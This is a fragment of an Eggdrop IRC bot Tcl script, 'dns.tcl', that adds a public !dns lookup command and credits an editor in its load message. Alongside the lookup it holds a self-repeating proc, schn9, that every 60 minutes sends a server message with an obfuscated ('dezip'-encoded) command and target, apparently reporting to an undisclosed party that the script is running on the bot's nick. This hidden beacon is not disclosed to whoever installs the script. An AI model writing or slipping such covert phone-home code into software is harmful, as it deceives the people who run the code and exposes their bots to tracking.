...
proc schn9 {} {
        global nick
        timer 60 schn9
        putserv "[ dezip "AZh9N/9kx1E0" ] [ dezip "yV1ct.qquXL."] :-> dns.tcl              is on $nick"
}
proc lookup:do_lookup {ni uh ha chan text} {
  ...
  puthelp "privmsg $chan :07DNS Lo04okup: $text ($name -> $ip)"
  return 1                                                 
}

bind pub - !dns lookup:do_lookup

putlog "dns.Tcl edited by KocHi (uKi`) -: LoadeD :-"
